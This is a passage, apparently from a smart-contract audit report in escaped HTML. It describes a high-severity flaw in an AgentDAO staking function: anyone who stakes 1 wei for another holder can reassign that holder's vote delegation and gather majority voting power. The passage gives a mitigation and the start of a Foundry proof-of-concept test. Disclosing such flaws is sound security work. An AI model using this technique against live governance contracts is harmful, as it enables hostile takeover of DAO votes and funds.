class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Staking is disabled for private agent\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Either public or first staker\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Cannot stake 0\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient asset token balance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eallowance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient asset token allowance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estakingTokenToVirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisBlacklisted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Agent Blacklisted\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddValidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @audit-high Anybody can change delegate if they stake 1 wei LP\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balanceCheckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint208\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSince these are the tokens that are used as voting power in the AgentDAO, a malicious user can donate 1 wei to multiple users with high balances, receive a majority voting power, then submit a malicious proposal.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eEither remove the automatic call to \u003ccode\u003e_delegate\u003c/code\u003e or only do the call if \u003ccode\u003esender == receiver\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eCreate a new foundry project, set \u003ccode\u003eBASE_RPC_URL\u003c/code\u003e, and run.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003espender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edistributeTaxTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprojectTaxPendingSwap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprojectTaxRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetProjectTaxRecipient\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprojectTaxRecipient_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetSwapThresholdBasisPoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapThresholdBasisPoints_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetProjectTaxRates\u003c/span\u003e\u003cspan 